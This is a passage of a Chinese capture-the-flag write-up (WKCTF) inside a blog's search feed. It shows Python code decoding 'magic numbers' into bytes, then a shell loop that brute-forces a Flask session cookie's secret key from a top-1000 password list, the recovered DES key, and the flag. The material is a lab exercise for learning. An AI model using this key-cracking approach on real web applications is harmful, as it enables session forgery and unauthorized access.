class="number">9</span>),  <span class="comment"># a2</span></span><br><span class="line">    <span class="number">3425</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;magic.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">807</span>):</span><br><span class="line">        magic_number = f.readline().strip()</span><br><span class="line">        number = reverse_magic(magic_number)</span><br><span class="line">        res = res + <span class="built_in">str</span>(PYTHON_MAGIC[number][<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res)))</span><br></pre></td></tr></table></figure><p>打开得到的信息是flask-session，需要去解密，并且提示了密钥为弱口令。github上可以找到工具flask-session-cookie-manager，因为要爆破，所以搞个shell脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"> <span class="keyword">while</span> read line</span><br><span class="line"> do</span><br><span class="line">  echo $line</span><br><span class="line">  python3  flask_session_cookie_manager3.py decode -s $line -c <span class="string">&#x27;eyJhbGdvcml0aG0iOiJkZXMiLCJmbGFnIjoiVW5BbVBWWTRhdCt2bkJqellPNytUZEZSMmZEYnhScytqQzdsMWt2b2hUMFp4clBDOEJUTWJBPT0ifQ.ZkyTwA.KPlAnhfBH8qMClLyoP6yboafHyw&#x27;</span></span><br><span class="line"> done &lt;  top1000.txt</span><br></pre></td></tr></table></figure><p>爆破得到：</p><p>12312312</p><p>{‘algorithm’: ‘des’, ‘flag’: ‘UnAmPVY4at+vnBjzYO7+TdFR2fDbxRs+jC7l1kvohT0ZxrPC8BTMbA&#x3D;&#x3D;’}</p><p>显然在线网站解des即可，密钥就是12312312</p><p>在线网站：<a href="https://the-x.cn/cryptography/Des.aspx">DES在线解密 DES在线加密 des hex - The X 在线工具 (the-x.cn)</a></p><p>WKCTF{N0w_u_Know_th3_fl4sk_Sess1on}</p>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
